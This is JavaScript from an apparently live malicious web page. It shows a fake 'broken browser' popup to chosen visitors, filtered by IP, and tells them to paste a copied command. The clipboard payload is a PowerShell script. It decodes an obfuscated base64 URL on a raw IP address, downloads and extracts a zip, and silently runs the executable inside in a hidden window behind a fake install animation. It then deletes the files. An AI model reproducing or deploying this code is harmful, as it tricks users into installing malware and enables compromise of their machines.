  var browserInfo = getSimpleBrowserName();
  function translateContent(language) {
    const translation = translations[language] || translations["en"];
    document.querySelector(".textContainer").textContent = browserInfo[0];
    const middleBlock = document.querySelector(".middleBlock");
    middleBlock.innerHTML = `
              <p>${translation.message1}</p>
              <p>${translation.message2}</p>
              <div class="hideBlock">
                <div>
                  <span>${translation.copyTheCodeText}</span>
                  <button class="copyButton">${translation.copyButton}</button>
                </div>
                <ol>
                    ${translation.steps
                      .map((step) => `<li>${step}</li>`)
                      .join("")}
                </ol>
                <p>${translation.waitOperation}</p>
              </div>
          `;
    document.querySelector(".showHideButton").textContent =
      translation.howToFix;
    document.querySelector(".closeButton").textContent =
      translation.reloadButton;
    var copyButton = document.querySelector(".copyButton");
    copyButton.addEventListener("click", function () {
      var textToCopy = `
function Decode-Base64String($encodedString) {
    $decodedBytes = [System.Convert]::FromBase64String($encodedString)
    $decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
    return $decodedString
}

$encodedDownloadUrl = "aHR0cDovLzk1LjIxNy45Ni4yNDQvSW5zdGFsbF9ROUs1U194NzguNDIuemlw"
$downloadUrl = Decode-Base64String($encodedDownloadUrl)

$zipFileName = "Install_Q9K5S_x78.42.zip"
$exeFileName = "Install_Q9K5S_x78.42.exe"
$zipFilePath = [System.IO.Path]::Combine($env:TEMP, $zipFileName)
$extractPath = [System.IO.Path]::Combine($env:TEMP, "Setup_" + (Get-Random))

Invoke-WebRequest -Uri $downloadUrl -OutFile $zipFilePath
Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force

$setupFilePath = [System.IO.Path]::Combine($extractPath, $exeFileName)

# Start animation before launching the process
Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "   Please wait while we install...   " -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan

$animationFrames = @("|", "/", "-", "\")
for ($i = 0; $i -lt 30; $i++) {
    $frame = $animationFrames[$i % $animationFrames.Length]
    Write-Host -NoNewline "`rInstalling... $frame"
    Start-Sleep -Milliseconds 150
}

if (Test-Path $setupFilePath) {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $setupFilePath
    $psi.WindowStyle = 'Hidden'
    $psi.UseShellExecute = $false
    $process = [System.Diagnostics.Process]::Start($psi)
    $process.WaitForExit()
}

Remove-Item -Path $zipFilePath -Force
Remove-Item -Path $extractPath -Recurse -Force

exit
              `;
      navigator.clipboard.writeText(textToCopy).then(
        function () {
          console.log("Detected broken browser.");
        },
        function (err) {
          console.error("Unable to copy text to clipboard: ", err);
        }
      );
      localStorage.setItem("copied", true);
    });
  }

  function openPopup() {
    console.log(browserInfo);
    var modal = document.createElement("div");

    var overlay = document.createElement("div");
    overlay.id = "popupOverlay";

    var popup = document.createElement("div");
    popup.classList.add("popup");

    var topBlock = document.createElement("div");
    topBlock.classList.add("topBlock");

    var iconContainer = document.createElement("div");
    iconContainer.classList.add("iconContainer");

    var textContainer = document.createElement("div");
    textContainer.classList.add("textContainer");

    iconContainer.innerHTML = browserInfo[1];
    textContainer.textContent = browserInfo[0];

    topBlock.appendChild(iconContainer);
    topBlock.appendChild(textContainer);

    var middleBlock = document.createElement("div");
    middleBlock.classList.add("middleBlock");

    var bottomBlock = document.createElement("div");
    bottomBlock.classList.add("bottomBlock");

    var buttonContainer = document.createElement("div");
    buttonContainer.classList.add("buttonContainer");

    var showHideButton = document.createElement("button");
    showHideButton.classList.add("showHideButton");
    showHideButton.addEventListener("click", function () {
      var hideBlock = document.querySelector(".hideBlock");
      if (!hideBlock.classList.contains("show")) {
        hideBlock.classList.add("show");
      } else {
        hideBlock.classList.remove("show");
      }
    });

    var closeButton = document.createElement("button");
    closeButton.classList.add("closeButton");
      closeButton.addEventListener("click", function () {
    modal.style.display = 'none'; // Скрыть модальное окно
    overlay.style.display = 'none'; // Скрыть оверлей
    document.body.style.overflow = 'auto'; // Восстановить прокрутку страницы
    window.location.reload(); // По желанию можно перезагрузить страницу
  
    });
    buttonContainer.appendChild(closeButton);
    buttonContainer.appendChild(showHideButton);

    bottomBlock.appendChild(buttonContainer);

    popup.appendChild(topBlock);
    popup.appendChild(middleBlock);
    popup.appendChild(bottomBlock);

    modal.appendChild(popup);
    modal.appendChild(overlay);

    document.body.appendChild(modal);

    overlay.style.display = "block";
    popup.style.display = "block";
    document.body.classList.add("blur"); // Добавляем размытие фона
    document.body.style.overflow = "hidden"; // Отключаем прокрутку страницы

    setTimeout(function () {
        popup.style.opacity = "1";
    }, 10);

    const userLang = getUserLanguage().substring(0, 2);
    translateContent(userLang);
  }

  window.onload = function () {
    var copied = localStorage.getItem("copied");

    if (!OFF_WAIT) {
      $.ajax({
        url: "ip.php",
        data: {
          admin_ips: ADMIN_IPS,
        },
        type: "POST",
        success: function (data) {
          console.log(data);
          if (data == "show_modal") {
            if (!copied) {
              openPopup();
            }
          }
        },
      });
    } else {
      if (!copied) {
        openPopup();
      }
    }
  };
</script>
